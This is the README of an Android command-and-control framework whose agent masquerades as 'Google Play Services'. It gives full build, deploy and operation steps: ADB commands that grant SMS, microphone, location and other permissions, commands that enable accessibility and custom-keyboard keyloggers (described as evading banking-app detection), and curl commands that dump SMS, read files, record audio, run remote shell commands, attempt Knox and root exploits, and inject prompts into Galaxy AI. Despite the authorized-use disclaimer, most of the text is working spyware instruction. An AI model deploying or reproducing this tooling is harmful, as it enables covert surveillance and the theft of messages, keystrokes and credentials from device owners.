# Umbra — Android Red Team Framework

[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
[![Platform: Android](https://img.shields.io/badge/Platform-Android-green.svg)](#)
[![Server: Go](https://img.shields.io/badge/Server-Go%20%2F%20GoFrame-00ADD8.svg)](#)
[![Agent: Kotlin](https://img.shields.io/badge/Agent-Kotlin-7F52FF.svg)](#)
[![Transport: WSS + AES-256-GCM](https://img.shields.io/badge/Transport-WSS%20%2B%20AES--256--GCM-red.svg)](#)

> **Umbra** is a self-hosted Android command-and-control (C2) framework for **authorized red-team engagements and security research**. It pairs a stealthy Kotlin agent disguised as *"Google Play Services"* with a GoFrame v2 C2 server and a zero-dependency web dashboard. All traffic is WebSocket-over-TLS (`wss://`) with per-message AES-256-GCM encryption.

> ⚠️ **Authorized use only.** Umbra ships with privilege-escalation, permission-bypass, keylogging, and device-exploitation capabilities that are illegal to use against devices you do not own or lack explicit written permission to test. See the [Legal & Ethical Disclaimer](#legal--ethical-disclaimer) before using this code.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Repository Layout](#repository-layout)
- [Modules](#modules)
- [Quick Start — Build & Deploy](#quick-start--build--deploy)
- [Find Your Server IP](#find-your-server-ip)
- [Granting Permissions](#granting-permissions)
- [Keylogger Activation (Accessibility + IME)](#keylogger-activation-accessibility--ime)
- [Manual Testing (curl)](#manual-testing-curl)
- [API Reference](#api-reference)
- [Dashboard](#dashboard)
- [Troubleshooting](#troubleshooting)
- [Known Limitations](#known-limitations)
- [Environment](#environment)
- [Legal & Ethical Disclaimer](#legal--ethical-disclaimer)

---

## Features

- **Stealth agent** — installs as `org.umbra.core` with the display label *"Google Play Services"*.
- **16+ modules** — SMS, calls, contacts, files, shell, GPS, microphone, camera, silent-grant, Knox, AI injection, live monitoring, root, keylogger, and more.
- **Two keylogger modes** — an accessibility-service keylogger *and* a banking-app-safe IME (custom keyboard) keylogger.
- **Encrypted transport** — `wss://` with AES-256-GCM per-message encryption.
- **Self-signed TLS** — the server auto-generates a P-256 certificate on first run.
- **Live push monitoring** — SMS interception, call-state changes, clipboard, and keystroke streaming pushed to the dashboard in real time.
- **Persistence chain** — boot receiver, watchdog, network-change reconnection, FCM wake, and battery-optimization prompts.
- **Zero-dependency dashboard** — a single vanilla-JS `index.html` with SSE result streaming.

---

## Architecture

```
                          wss://YOUR_SERVER_IP:8443/c2
┌─────────────────────────────┐      AES-256-GCM      ┌──────────────────────────────┐
│   Android Agent (Kotlin)    │ ◄───────────────────► │    GoFrame C2 Server (Go)    │
│   package: org.umbra.core   │    encrypted frames   │    listens on :8443 (TLS)    │
│                             │                       │                              │
│   • 16+ modules             │                       │    • REST API  (/api/*)      │
│   • Knox binder exploits    │                       │    • WebSocket  (/c2)        │
│   • Keylogger (a11y + IME)  │                       │    • SSE events (/api/events)│
│   • Persistence chain       │                       │    • Device registry         │
│   • FCM wake               │                       │    • Command queue           │
└─────────────────────────────┘                       └───────────────┬──────────────┘
                                                                       │  SSE push
                                                                       ▼
                                                       ┌──────────────────────────────┐
                                                       │   Dashboard (vanilla JS)     │
                                                       │   resource/public/index.html │
                                                       │   device list + live results │
                                                       └──────────────────────────────┘
```

| Component | Language / Stack | Role |
|-----------|------------------|------|
| **Agent** | Kotlin (Android) | Runs on the target device, executes commands, streams results |
| **Server** | Go + GoFrame v2 | Terminates TLS, authenticates agents, queues commands, broadcasts results |
| **Dashboard** | Vanilla JS / HTML | Operator console: device list, one-click actions, live keystroke/results feed |
| **Transport** | WebSocket over TLS + AES-256-GCM | Bi-directional encrypted channel on port `8443` |

**Flow:** the dashboard (or `curl`) POSTs a command to `POST /api/command` → the server pushes it to the device over the `wss://` channel → the agent executes the module/action and returns an encrypted result → the server decrypts and broadcasts it to the dashboard via SSE (`GET /api/events`).

---

## Repository Layout

```
UMBRA/
├── Umbra-Client/                    # Kotlin Android agent
│   └── app/src/main/java/org/umbra/core/
│       ├── MainActivity.kt          # Launcher + engine bootstrap
│       ├── core/                    # Engine, crypto, info, sandbox detector
│       ├── c2/                      # WebSocket transport, coordinator, dispatcher
│       ├── modules/                 # 16+ capability modules
│       └── persistence/             # Boot/watchdog/network/FCM persistence
└── Umbra-Server/                    # GoFrame v2 C2 server
    └── umbra-c2/app/umbra-c2/
        ├── main.go                  # Entry point
        ├── internal/
        │   ├── cmd/                 # Routing, TLS, banner
        │   ├── controller/c2/       # HTTP + WebSocket handlers
        │   ├── service/             # WS, crypto, registry, broadcast
        │   └── model/               # Data structures
        └── resource/
            ├── public/index.html    # Dashboard
            └── server.crt/server.key# Auto-generated TLS cert
```

---

## Modules

### Core Modules (16)

| # | Module | Actions | Description | Status |
|---|--------|---------|-------------|--------|
| 1 | `ping` | `ping` | Round-trip latency check | ✅ |
| 2 | `info` | `gather` | Device info (model, SDK, fingerprint, hardware, arch) | ✅ |
| 3 | `sms` | `list` `read` `dump` `send` `capture` | SMS via `ContentResolver` + binder bypass fallback | ✅ (needs `pm grant`) |
| 4 | `calls` | `list` | Call log | ✅ |
| 5 | `contacts` | `list` | Contacts | ✅ |
| 6 | `files` | `list` `read` `download` | MediaStore enumeration + base64 file content | ✅ |
| 7 | `shell` | `exec` | Remote command execution | ✅ |
| 8 | `location` | `get` | GPS + network location | ⚠️ GPS off → timeout |
| 9 | `mic` | `record` `stop` | AAC audio capture (base64) | ✅ |
| 10 | `camera` / `screenshot` | `capture` / `screenshot` | Camera capture + screen capture | ❌ Knox HAL blocks camera |
| 11 | `silent_grant` | `grant` | 14 permission-bypass techniques | ❌ Android 16 blocks all 14 |
| 12 | `knox` | `grant` `enumerate` `shell_exploit` | Samsung Knox binder exploitation | ✅ binder accessible |
| 13 | `ai_inject` | `inject` `exfil` `status` | Galaxy AI prompt injection | ✅ Honeyboard detected |
| 14 | `live` | `start` `stop` `status` | Real-time push monitoring (SMS, call state, clipboard) | ✅ |
| 15 | `root` | `check` `exploit` `daemonize` `exploit_download` | 8-vector privilege-escalation chain | ⚠️ checks only, no root yet |
| 16 | `keylog` | `start` `stop` `dump` `status` `start_keyboard` `enable_keyboard` | Keystroke capture (accessibility + IME) | ✅ both modes |

### Additional Stealth Modules

| Module | Actions | Description |
|--------|---------|-------------|
| `clipboard` | `scrape` | Read clipboard text |
| `clipboard_image` | `readImage` | Read clipboard image |
| `notifications` | `list` | Capture all notifications (NotificationListenerService) |
| `knox_hide` / `knox_unhide` / `knox_check` | — | KnoxGuard hide/unhide/check |
| `knox_hide_v2` / `knox_unhide_v2` | — | KnoxHideExploit (advanced hide) |
| `semclipboard` | `scrape` | Samsung Semantic-clipboard exploit |

---

## Quick Start — Build & Deploy

### 0. Prerequisites

- **Server host:** Linux with Go ≥ 1.21 and GoFrame v2 dependencies.
- **Android device:** a test device with `adb` (USB debugging enabled), Android 11+.
- **Android SDK / JDK:** Android Studio (or a JDK 17+) to build the APK.

### 1. Build the C2 server

```bash
cd ~/UMBRA/Umbra-Server/umbra-c2/app/umbra-c2
export PATH="$HOME/go/bin:$HOME/go-projects/bin:$PATH"
go build -o /tmp/umbra-server .
```

### 2. Build the Android agent APK

```bash
cd ~/UMBRA/Umbra-Client
export JAVA_HOME="$HOME/.local/share/JetBrains/Toolbox/apps/android-studio/jbr"
./gradlew clean assembleDebug
```

> Output APK: `app/build/outputs/apk/debug/app-debug.apk`

### 3. Run the server

```bash
fuser -k 8443/tcp 2>/dev/null
/tmp/umbra-server
```

The server auto-generates a self-signed TLS certificate on first run and listens on `:8443`.

### 4. Install the agent

```bash
adb install app/build/outputs/apk/debug/app-debug.apk
```

### 5. Grant runtime permissions

```bash
for p in CAMERA ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION RECORD_AUDIO \
         READ_MEDIA_IMAGES READ_SMS READ_CONTACTS READ_CALL_LOG \
         READ_PHONE_STATE POST_NOTIFICATIONS; do
    adb shell pm grant org.umbra.core android.permission.$p
done
```

### 6. Launch the agent

```bash
adb shell am start -n org.umbra.core/.MainActivity
```

### 7. Open the dashboard

```text
https://YOUR_SERVER_IP:8443
```

(Open in an incognito/private window and hard-refresh with `Ctrl+Shift+R` on first load.)

### Uninstall

```bash
adb uninstall org.umbra.core
```

---

## Find Your Server IP

The dashboard URL uses **your machine's LAN IP**, not a fixed address — it changes per network. Find it with:

```bash
hostname -I
# Example output: 192.168.1.50 172.17.0.1
# Use the FIRST address (192.168.1.50 in this example)
```

Then open:

```text
https://192.168.1.50:8443
```

The agent connects to the **same IP** as the server. It reads the C2 endpoint from the `DEFAULT_C2` constant in `UmbraEngine.kt`, but you can override it at runtime via ADB without rebuilding:

```bash
adb shell "echo 'wss://YOUR_SERVER_IP:8443/c2' > /data/data/org.umbra.core/shared_prefs/umbra_c2_url"
adb shell am force-stop org.umbra.core
adb shell am start -n org.umbra.core/.MainActivity
```

> **Rebuild note:** the compiled APK hardcodes `DEFAULT_C2` in `Umbra-Client/app/src/main/java/org/umbra/core/core/SynapseEngine.kt`. If you need a fixed endpoint, change `DEFAULT_C2` there *before* building. The ADB override above is the fastest way to retarget an already-built APK.

---

## Granting Permissions

The agent targets Android 16 (SDK 36), where silent-permission-grant techniques are blocked for untrusted apps. Use ADB `pm grant` (or a root exploit) to grant dangerous permissions after install:

```bash
for p in CAMERA ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION RECORD_AUDIO \
         READ_MEDIA_IMAGES READ_SMS READ_CONTACTS READ_CALL_LOG \
         READ_PHONE_STATE POST_NOTIFICATIONS; do
    adb shell pm grant org.umbra.core android.permission.$p
done
```

The `silent_grant/grant` module attempts 14 binder-based bypass techniques as a fallback, but on Android 16 Samsung builds all 14 are blocked — ADB `pm grant` is the reliable path.

---

## Keylogger Activation (Accessibility + IME)

Umbra ships **two independent keyloggers**. Choose based on your target and OPSEC requirements.

| | Accessibility keylogger | IME (keyboard) keylogger |
|---|---|---|
| Module action | `keylog/start` | `keylog/start_keyboard` |
| Mechanism | `UmbraAccessibilityService` (`TYPE_VIEW_TEXT_CHANGED`) | `UmbraKeyboardService` (custom input method) |
| Detection | **Detected by banking apps** (they enumerate enabled accessibility services) | **Banking-app-safe** — input methods are not flagged the way accessibility services are |
| Enable once via ADB | Yes | Yes (victim must select it once) |

### Method A — Accessibility service (simpler, more detectable)

Enable the accessibility service via ADB:

```bash
adb shell settings put secure enabled_accessibility_services org.umbra.core/org.umbra.core.modules.UmbraAccessibilityService
adb shell settings put secure accessibility_enabled 1
```

Then start the keylogger (dashboard **Keylog Start** button, or curl):

```bash
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"start"}'
```

### Method B — IME custom keyboard (banking-app-safe)

Enable and select the Umbra keyboard as the active input method:

```bash
adb shell ime enable org.umbra.core/.modules.UmbraKeyboardService
adb shell ime set    org.umbra.core/.modules.UmbraKeyboardService
```

Then start the IME keylogger:

```bash
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"start_keyboard"}'
```

> On a device without `WRITE_SECURE_SETTINGS`, the agent falls back to opening the Accessibility / input-method settings screen so the user can enable it manually.

### Retrieve, stop, and status

```bash
# Dump captured keystrokes (buffer + encrypted on-disk store)
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"dump"}'

# Stop capture (persists buffer to disk)
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"stop"}'

# Check capture state (accessibility_enabled / ime_enabled / ime_default / streaming)
curl -k -X POST https://YOUR_SERVER_IP:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"<DEVICE_ID>","module":"keylog","action":"status"}'
```

**How it works:** keystrokes are buffered in memory (max 1000 entries) and persisted to an XOR-encrypted on-disk file (`umbra_keylog.dat`). When streaming is enabled, each keystroke (with package name and timestamp) is pushed to the C2 server in real time and rendered in the dashboard's live *KEYSTROKES* panel.

---

## Manual Testing (curl)

Use `curl -k` to skip the self-signed certificate check. Replace `YOUR_SERVER_IP` and `<DEVICE_ID>` (find the device ID with `GET /api/devices`).

```bash
URL="https://YOUR_SERVER_IP:8443"
ID="<DEVICE_ID>"
```

### 1. ping

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"ping","action":"ping"}'
```

### 2. info / gather

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"info","action":"gather"}'
```

### 3. sms

```bash
# List recent SMS
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"sms","action":"list","params":{"count":"3"}}'

# Dump full SMS database
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"sms","action":"dump"}'

# Send an SMS (test device only)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"sms","action":"send","params":{"to":"+15551234567","body":"test"}}'
```

### 4. calls

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"calls","action":"list","params":{"count":"3"}}'
```

### 5. contacts

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"contacts","action":"list","params":{"count":"3"}}'
```

### 6. files

```bash
# List images
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"files","action":"list","params":{"type":"images","count":"5"}}'

# List documents
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"files","action":"list","params":{"type":"documents","count":"5"}}'

# Read a file by absolute path (returns base64 content)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"files","action":"read","params":{"path":"/sdcard/Download/example.txt"}}'
```

### 7. shell

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"shell","action":"exec","params":{"cmd":"id; uname -a"}}'
```

### 8. location

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"location","action":"get"}'
```

### 9. mic

```bash
# Record 5 seconds of AAC audio (base64)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"mic","action":"record","params":{"duration":"5"}}'

# Stop recording
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"mic","action":"stop"}'
```

### 10. camera / screenshot

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"camera","action":"capture"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"screenshot","action":"screenshot"}'
```

### 11. silent_grant

```bash
# Attempt all 14 permission-bypass techniques (comma-separated target list)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"silent_grant","action":"grant","params":{"permissions":"CAMERA,RECORD_AUDIO,ACCESS_FINE_LOCATION"}}'
```

### 12. knox

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"knox","action":"grant"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"knox","action":"enumerate"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"knox","action":"shell_exploit"}'
```

### 13. ai_inject

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"ai_inject","action":"inject"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"ai_inject","action":"status"}'
```

### 14. live

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"live","action":"start"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"live","action":"status"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"live","action":"stop"}'
```

### 15. root

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"root","action":"check"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"root","action":"exploit"}'
```

### 16. keylog (see [Keylogger Activation](#keylogger-activation-accessibility--ime))

```bash
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"keylog","action":"start"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"keylog","action":"start_keyboard"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'$ID'","module":"keylog","action":"dump"}'
```

---

## API Reference

Base URL: `https://YOUR_SERVER_IP:8443`

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/health` | Server health: status, device count, online count, uptime |
| `GET` | `/api/devices` | List registered devices (id, info, last_seen, online, has_fcm) |
| `POST` | `/api/command` | Queue a command for a device |
| `POST` | `/api/result` | HTTP fallback for agent result delivery (encrypted payload) |
| `POST` | `/api/register-fcm` | Register an FCM token for push wake |
| `GET` | `/api/stage2?file=stage2.dex` | Serve native exploit payloads (`stage2.dex`, `payload.sh`) |
| `GET` | `/api/events` | Server-Sent Events stream for dashboard results |
| `GET` | `/c2` | WebSocket upgrade endpoint for agent connections |
| `GET` | `/` | Dashboard (static files from `resource/public/`) |

### Command format (`POST /api/command`)

```json
{
  "device_id": "<DEVICE_ID>",
  "module": "sms",
  "action": "list",
  "params": { "count": "5" }
}
```

Response:

```json
{ "command_id": "<uuid>", "status": "queued" }
```

Results are delivered asynchronously — over the WebSocket to the agent, back encrypted, then broadcast to the dashboard via SSE. The agent also supports an HTTP fallback path via `POST /api/result`.

---

## Dashboard

Open `https://YOUR_SERVER_IP:8443` in a browser.

- **DEVICES panel (left):** auto-selects the first online device; shows per-device id, model, OS, and online dot (green/red).
- **Toolbar (top):** one-click actions — **Ping, Info, SMS, Calls, Contacts, Images, Docs, Shell, GPS, Mic, Screen, Grant**.
- **Keylogger toolbar:** **Keylog Start / Stop / Dump / Status**.
- **KEYSTROKES panel:** live keystroke feed (package + text + timestamp).
- **RESULT panel:** decoded command output (JSON), including base64 file/audio content rendered as previews/downloads.

> If the dashboard appears empty on first load, open it in an incognito window and hard-refresh (`Ctrl+Shift+R`).

---

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| Agent offline / not listed | `adb shell am force-stop org.umbra.core && adb shell am start -n org.umbra.core/.MainActivity` |
| Dashboard empty / stale | Open in incognito, `Ctrl+Shift+R` hard-refresh |
| `permission_denied` on module output | Re-run the `pm grant` loop after install |
| Server crash / port in use | `fuser -k 8443/tcp 2>/dev/null; /tmp/umbra-server` |
| APK changes not taking effect | Always `./gradlew clean assembleDebug` (not `assembleDebug`) |
| TLS cert warning in browser | Expected — the server uses a self-signed cert; proceed / import it |
| Agent connects to wrong IP | Re-issue the ADB `umbra_c2_url` override, or set `DEFAULT_C2` and rebuild |
| Camera / screen capture fails | Knox HAL / SELinux block it from an untrusted app; see Known Limitations |

---

## Known Limitations

- **Permissions** — Android 16 (Samsung) blocks all silent-grant techniques from an untrusted app. Requires ADB `pm grant` or a root exploit.
- **Camera** — Knox HAL blocks the Camera2 API (`CAMERA_DISABLED by policy`). The `misc_policy` binder may unlock it.
- **Screenshot** — SELinux blocks `screencap` for untrusted apps. Requires shell UID or root.
- **Location** — GPS fix times out if the GPS radio is off; network-location fallback is partial.
- **Root** — the 8-vector chain currently *detects* privilege-escalation opportunities but has not achieved root on the tested device.
- **Self-signed TLS** — the generated certificate is untrusted by browsers; use `curl -k` or import it manually.

---

## Environment

| Component | Value |
|-----------|-------|
| **Test device** | Samsung Galaxy A35 (SM-A356B) |
| **Android** | 16 (SDK 36), One UI 8.5 |
| **Kernel** | 6.6.98 (July 2026 patch) |
| **SoC** | Exynos 1380 (s5e8835) |
| **Server** | Go 1.21+, GoFrame v2 |
| **Agent** | Kotlin, Gradle 9.4.1 (wrapper), Android SDK 36 |
| **Dashboard** | Vanilla JS / HTML + SSE |
| **Transport** | `wss://` + AES-256-GCM, port `8443` |
| **License** | AGPL-3.0 |

---

## Legal & Ethical Disclaimer

**Umbra is a red-team and security-research tool for use on systems you own or have explicit written authorization to test.**

- Do **not** install or run Umbra on any device you do not own or lack permission to test. Unauthorized access to a computer or communications device is a crime in most jurisdictions (e.g., the US Computer Fraud and Abuse Act, the UK Computer Misuse Act, and analogous laws worldwide).
- The authors provide this code **for educational and defensive purposes only** — to help researchers and defenders understand mobile threats, test defenses, and build detections.
- By using this software you accept **full legal and ethical responsibility** for your actions. The authors and contributors assume **no liability** for any misuse, damage, or legal consequences arising from the use of this project.
- If you are a defender, use Umbra to validate EDR/MDM detections, test your incident-response playbooks, and harden your fleet — not to target third parties.

---

## License

[AGPL-3.0](LICENSE) — see `LICENSE` and `NOTICE` for details.
